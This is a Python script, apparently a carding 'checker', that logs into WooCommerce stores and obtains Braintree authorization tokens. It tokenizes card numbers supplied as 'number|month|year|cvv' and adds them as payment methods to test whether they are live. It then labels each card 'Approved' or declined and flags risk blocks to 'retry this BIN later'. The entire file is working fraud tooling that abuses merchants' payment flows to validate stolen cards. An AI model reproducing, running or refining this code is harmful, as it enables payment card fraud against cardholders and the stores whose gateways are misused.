import user_agent
import time
import httpx,requests
import base64
import random
import string
import faker
import re
import asyncio

fake = faker.Faker()
def getstr(response,start,end):
	x = response.split(start)[1]
	z = x.split(end)[0]
	return z
	

async def b3(url,cc,client,username):
		num,mon,yer,cvv = map(str.strip,cc.split("|"))
		url = url.strip()
		user = user_agent.generate_user_agent()
		headers = {
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'cache-control': 'no-cache',
		'pragma': 'no-cache',
		'user-agent': user
		}
		# capturing registration nonce » START
		response = await client.get(url+"/my-account/", headers=headers)
		login = re.search(r'name="woocommerce-login-nonce" value="(.*?)"',response.text).group(1) # registration nonce
		# capturing registration nonce » END
		
		
		# registration process » START
		data = {
		'username':username,
		'password':'Lakalama@777',
		'woocommerce-login-nonce': login,
		'_wp_http_referer': '/my-account/',
		'login': 'Log in'
		}
		response = await client.post(url+"/my-account/", cookies=client.cookies,data=data,headers=headers)
		# registration process » END
		
		# capturing add payment method nonce » START
		response = await client.get(url+"/my-account/add-payment-method/", cookies=client.cookies, headers=headers)
		add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
		client_nonce = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
		#client_token = getstr(response.text, 'wc_braintree_client_token = ["', '"]')
		# capturing add payment method nonce » END
		
		
		# capturing braintree auth token » START
		data = {
		'action': 'wc_braintree_credit_card_get_client_token',
		'nonce': client_nonce
		}
		response = await client.post(url+"/wp-admin/admin-ajax.php", cookies=client.cookies, headers=headers, data=data)
		enc = response.json()['data']
		dec = base64.b64decode(enc).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
		# capturing braintree auth token » END
		
		
		# generating payment auth token » START
		headers = {
		'authority': 'payments.braintree-api.com',
		'accept': '*/*',
		'authorization': f'Bearer {au}',
		'braintree-version': '2018-05-10',
		'cache-control': 'no-cache',
		'content-type': 'application/json',
		'pragma': 'no-cache',
		'user-agent': user
		}
		json_data = {
		    'clientSdkMetadata': {
		        'source': 'client',
		        'integration': 'custom',
		        'sessionId': '9c8cc072-4588-4af4-b73e-a4f0d2af84e4',
		    },
		    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
		    'variables': {
		        'input': {
		            'creditCard': {
		                'number': num,
		                'expirationMonth': mon,
		                'expirationYear': yer,
		                'cvv': cvv,
		            },
		            'options': {
		                'validate': False,
		            },
		        },
		    },
		    'operationName': 'TokenizeCreditCard',
		}
		response = await client.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		try:
			tok = response.json()['data']['tokenizeCreditCard']['token']
		except Exception as e:
			return str(e)
		# generating payment auth token » START
		
		
		# checking card » START
		headers = {
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'cache-control': 'no-cache',
		'content-type': 'application/x-www-form-urlencoded',
		'pragma': 'no-cache',
		'user-agent': user
		}
		data = {
		'payment_method': 'braintree_credit_card',
		'wc-braintree-credit-card-card-type': 'master-card',
		'wc-braintree-credit-card-3d-secure-enabled': '',
		'wc-braintree-credit-card-3d-secure-verified': '',
		'wc-braintree-credit-card-3d-secure-order-total': '0.00',
		'wc_braintree_credit_card_payment_nonce': tok,
		'wc_braintree_device_data': '',
		'wc-braintree-credit-card-tokenize-payment-method': 'true',
		'woocommerce-add-payment-method-nonce': add_nonce,
		'_wp_http_referer': '/my-account/add-payment-method/',
		'woocommerce_add_payment_method': '1'
		}
		response = await client.post(url+"/my-account/add-payment-method/", cookies=client.cookies, headers=headers, data=data)
		# checking card » END
		
		
		# checking response » START
		response = await client.get(url+"/my-account/",cookies=client.cookies,headers=headers)
		text = response.text
		pattern = r'Status code (.*?)\s*</div>'
		match = re.search(pattern, text)
		if match:
			result = match.group(1)
			if 'risk_threshold' in text:
				result = "RISK: Retry this BIN later. ❌"
		else:
			if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
				result = "1000: Approved ✅"
			else:
				result = "Error"
		if 'funds' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return f"{result} ✅"
		else:
			return f"{result} ❌"
		# checking response » END
		await client.aclose()
